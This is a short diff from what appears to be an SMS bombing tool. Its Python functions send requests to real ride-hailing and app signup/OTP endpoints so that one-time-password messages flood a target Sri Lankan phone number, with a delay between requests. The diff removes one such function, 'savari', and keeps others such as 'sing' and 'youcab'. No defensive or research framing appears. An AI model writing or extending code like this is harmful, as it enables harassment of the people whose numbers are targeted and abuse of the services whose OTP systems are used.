@@ -133,11 +133,6 @@ def sing(num,delay):
     body={'appId':'5ddd5cf840471839fef5125f','uuId':'04ff7be9ec7d63ba','msisdn': '94'+num[1:]}
     po=post(url,headers=head,json=body)
     time.sleep(delay)
-def savari(num,delay):
-    url='https://api.savarisrilanka.com/api/tenantIdNextTransportSLProd00001/users/signup-otp/request'
-    body={'email':'a1@slt.net','numCountryCode':'+94','phoneNum':num[1:],'referralCode':'','userType':'passenger'}
-    po=post(url,json=body)
-    time.sleep(delay)
 def youcab(num,delay):
     url='http://youcab-apps.com/vconnect/passenger/v1/clientPinRequestData_droid.php'
     body={'countrycode':'%2B94','mobile':num,'name':'s','email':''}
